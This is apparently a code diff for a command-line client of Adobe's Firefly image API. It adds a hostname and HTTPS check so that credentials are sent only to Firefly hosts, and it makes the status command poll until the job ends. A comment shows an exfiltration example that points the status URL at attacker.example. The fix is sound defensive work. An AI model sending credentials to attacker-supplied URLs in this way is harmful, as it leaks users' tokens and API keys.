@@ -22,6 +22,31 @@ const IMS_TOKEN_URL = 'https://ims-na1.adobelogin.com/ims/token/v3';
 const GENERATE_URL = 'https://firefly-api.adobe.io/v3/images/generate-async';
 const CUSTOM_MODELS_URL = 'https://firefly-api.adobe.io/v3/custom-models';
 
+// Firefly returns region-specific status hosts (e.g. firefly-epo853211.adobe.io),
+// so the status URL cannot be a fixed constant. Restrict it to HTTPS on a Firefly
+// Adobe host before attaching the bearer token + API key — otherwise a hostile
+// status URL (e.g. `firefly status https://attacker.example/...`) would exfiltrate
+// the caller's credentials. Accept `firefly-api.adobe.io` and `firefly-<region>.adobe.io`.
+const FIREFLY_HOST_RE = /^firefly(-[a-z0-9]+)?\.adobe\.io$/i;
+
+// Validate an untrusted status URL BEFORE building the authenticated request.
+// Returns the normalized URL string; dies with an actionable message otherwise.
+function assertFireflyStatusUrl(raw) {
+  let u;
+  try {
+    u = new URL(raw);
+  } catch {
+    cli.die('firefly status needs the full status URL (https://firefly-<region>.adobe.io/v3/status/<jobId>).', { prefix: 'firefly' });
+  }
+  if (u.protocol !== 'https:') {
+    cli.die(`refusing to send credentials over ${u.protocol || 'a non-https'} URL — the status URL must be https.`, { prefix: 'firefly' });
+  }
+  if (!FIREFLY_HOST_RE.test(u.hostname)) {
+    cli.die(`refusing to send credentials to untrusted host "${u.hostname}". The status URL must be an Adobe Firefly host (firefly-<region>.adobe.io), exactly as returned by generate.`, { prefix: 'firefly' });
+  }
+  return u.toString();
+}
+
 // Model selection is done via the `x-model-version` request HEADER (NOT a body
 // field — body model fields are silently ignored). Verified live 2026-07-24:
 // only these four header values are accepted; anything else (image4, image5,
@@ -411,32 +436,32 @@ async function cmdGenerate(positional, flags) {
 }
 
 async function cmdStatus(positional, flags) {
-  const statusUrl = positional[0] || flags['status-url'];
-  if (!statusUrl) {
+  const rawUrl = positional[0] || flags['status-url'];
+  if (!rawUrl) {
     cli.die('Usage: firefly status <statusUrl>\nPass the full status URL returned by generate (the region host cannot be reconstructed from a bare jobId).', { prefix: 'firefly' });
   }
-  if (!/^https?:\/\//i.test(statusUrl)) {
-    cli.die('firefly status needs the full status URL (https://firefly-<region>.adobe.io/v3/status/<jobId>).', { prefix: 'firefly' });
-  }
+  // P1: validate the host/scheme BEFORE attaching the bearer token + API key so
+  // credentials can never be sent to an attacker-controlled URL.
+  const statusUrl = assertFireflyStatusUrl(rawUrl);
 
   const headers = await fireflyHeaders();
-  const res = await fetch(statusUrl, { headers });
-  if (!res.ok) {
-    let detail = await res.text();
-    try { const j = JSON.parse(detail); detail = j.message || j.error_code || detail; } catch { /* raw */ }
-    if (res.status === 401 || res.status === 403) cli.die(`Firefly auth error (${res.status}). Run: firefly login`, { prefix: 'firefly' });
-    cli.die(`Status request failed (${res.status}): ${detail}`, { prefix: 'firefly' });
+
+  // Poll to a terminal state (matches documented behavior and reuses the same
+  // terminal-state + failure handling as generate). pollStatus throws on
+  // failure/timeout/auth error — map those to actionable, non-zero exits.
+  let body;
+  try {
+    body = await pollStatus(statusUrl, headers);
+  } catch (err) {
+    if (err?.name === 'NodeExitError') throw err;
+    const msg = String(err?.message || err);
+    if (/\(401\)|\(403\)/.test(msg)) {
+      cli.die(`Firefly auth error. Run: firefly login`, { prefix: 'firefly' });
+    }
+    cli.die(msg, { prefix: 'firefly' });
   }
-  const body = await res.json();
 
   if (flags.json) { cli.out(body); return; }
-
-  if (body.status !== 'succeeded') {
-    console.log();
-    console.log(`  ${color.yellow(body.status || 'unknown')}${body.jobId ? '  ' + color.dim(body.jobId) : ''}`);
-    console.log();
-    return;
-  }
 
   const result = body.result || body;
   let saved = null;
